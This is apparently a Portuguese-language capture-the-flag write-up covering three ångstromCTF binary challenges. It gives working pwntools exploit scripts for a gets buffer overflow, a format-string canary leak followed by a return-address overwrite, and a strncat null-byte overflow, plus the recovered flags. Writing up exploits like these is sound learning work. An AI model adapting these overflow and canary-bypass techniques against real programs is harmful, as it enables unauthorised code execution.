# No Canary - Binary
Olhando o codigo fonte encontramos uma função vulneravel `gets`, como ja foi informado no nome da chall não tem a proteção canary ativa.
```c
char name[20];
gets(name);
```
* precisamos encontrar a quantidade de bytes para sobrescrever `$RIP`
* encontrar um endereço de retorno para chamar a função `flag`
* pegar o endereço da função `flag`
```python
from pwn import *
context(arch='amd64', os='linux')
#context.log_level = "DEBUG"

def run():
    s = process('no_canary')
    s = remote("shell.actf.co",20700)

    junk = str("A"*32).encode() # depois de 32 bytes conseguimos sobrecrever $RIP
    ret_addr  = p64(0x00000000004012dd) # sobrescreve $RIP com o endereço de retorno da main
    flag_addr = p64(0x0000000000401186) # o endereço de retorno chama da função flag que esta em $RSP

    print(s.recvuntil("your name? "))
    s.sendline(junk+ret_addr+flag_addr)

    print(s.recv())
    print(s.recv())
    #s.interactive(prompt="")
run()
```
FLAG >> actf{that_gosh_darn_canary_got_me_pwned!}
# Canary - Binary
Olhando o codigo fonte encontramos algumas funções vulneraveis `gets`,`printf`, como ja foi informado no nome da chall a proteção canary esta ativada.
```c
char name[20];
gets(name);
printf(strcat(name, "!\n"));
char info[50];
gets(info);
```
* na primeira entrada temos que vazar o `Stack Cookie` caso os cookie seja sobrecrita com um valor diferente o programa sera encerrado
* sobrescrever o Registrador que checa se o cookie foi alterado neste caso é o $RAX
* sobrescrever $RBP com algum endereço
* sobrescrever $RSP com o endereço da função flag

```python
from pwn import *
#echo 2 > /proc/sys/kernel/randomize_va_space
context(arch='amd64', os='linux')
#context.log_level = "DEBUG"

def run():
        #s = process('canary')
        s = remote("shell.actf.co",20701)

        junk = "A" * (56) # depois de 56 bytes conseguimos sobrecrever $RAX
        main = 0x400957 # endereço da função main
        flag = 0x400787 # endereço da função flag

        print(s.recvuntil("your name? "))
        s.sendline(str("%15$lx.%17$lx"))

        leak = bytes(s.recvuntil("tell me? ")).decode()
        print(leak)
        #print(hex(int(leak[18:30],16 )))
        cookie = int(leak[31:(31+16)], 16)
        #try:
        #    raw_input("aguarde")
        #except:
        #    pass
        p = junk.encode() # lixo
        p += p64(cookie) # sobrescreve $RAX
        p += p64(main) # sobrescreve $RBP
        p += p64(flag) # sobrescreve $RSP
        
        s.sendline(p)
        s.interactive(prompt="")
run()
```

FLAG >> actf{youre_a_canary_killer_>:(}
# Bop It - Binary
Olhando o codigo aparentemente não existe nenhuma função vulneravel no codigo fonte.
mas olhando bem exite sim uma função vulneravel `strncat`
```c
strncat(wrong, guess, guessLen);
strncat(wrong, " was wrong. Better luck next time!\n", 35);
```
| `strncpy` e `strncat` não garante que a sequência seja terminada em nulo.

Então porque não enviar varios null e ver o que acontece.
```python
from pwn import *
#echo 2 > /proc/sys/kernel/randomize_va_space
context(arch='amd64', os='linux')
#context.log_level = "DEBUG"

def run():
    #s = process('bop_it')
    s = remote("shell.actf.co",20702)
	q = ""
	b = b''
	while "wrong" not in q:
		b = s.recvline()
		q = bytes(b).decode()
		if q in ["Bop it!\n", "Twist it!\n", "Pull it!\n"]:
			print(q)
			s.sendline(q[0])
		if q in ["Flag it!\n"]:
			print(q)
			s.sendline("\x00"*300)
			print(s.recv()[0x80:(0x80+25)])
			exit()
run()
```
FLAG >> actf{bopp1ty_bop_bOp_b0p}
# Consolation - Web
# Secret Agents - Web 
# Defund's Crypt - Web
# Woooosh - Web